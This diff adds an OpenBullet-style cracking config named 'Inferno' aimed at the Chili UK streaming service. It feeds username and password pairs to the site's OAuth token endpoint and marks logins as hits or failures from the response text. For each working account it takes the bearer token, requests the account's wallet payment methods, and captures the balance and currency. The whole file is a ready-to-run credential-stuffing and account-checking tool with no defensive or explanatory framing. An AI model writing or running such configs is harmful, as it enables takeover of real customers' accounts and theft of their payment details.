@@ -1,0 +1,46 @@
+[SETTINGS]
+{
+  "Name": "uk.chilis.com | Inferno",
+  "SuggestedBots": 1,
+  "LastModified": "2018-07-01T14:13:14.5927442+00:00",
+  "AdditionalInfo": "Proxyless, More Capture canbe added",
+  "Author": "Inferno",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "None",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#Post.Inferno REQUEST POST "https://uk.chili.com/gatekeeper/api/v1/oauth2/token" AutoRedirect=TRUE 
+  CONTENT "grant_type=password&username=<USER>&password=<PASS>&x_device_id=980fcc80-455a-4f57-b7d8-8ad72b8d7988" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#KEY_CHECK.Inferno KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "\"Wrong E-mail and/or Password\"," 
+  KEYCHAIN Success OR 
+    KEY "\"access_token\" " 
+#TheToken.Inferno PARSE "<SOURCE>" LR "\"access_token\" : \"" "\"" Recursive=FALSE -> VAR "T" "" "" 
+#CapturePage.Inferno REQUEST GET "https://uk.chili.com/bill/api/v2/wallet/me/paymentMethods" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "authorization: Bearer <T>" 
+#TheCap1.Inferno PARSE "<SOURCE>" LR "balance\" : " "," Recursive=FALSE -> CAP "Balance" "" "" 
+#TheCap2.Inferno PARSE "<SOURCE>" LR "\"currency\" : \"" "\"" Recursive=FALSE -> VAR "Currency" "" "" 
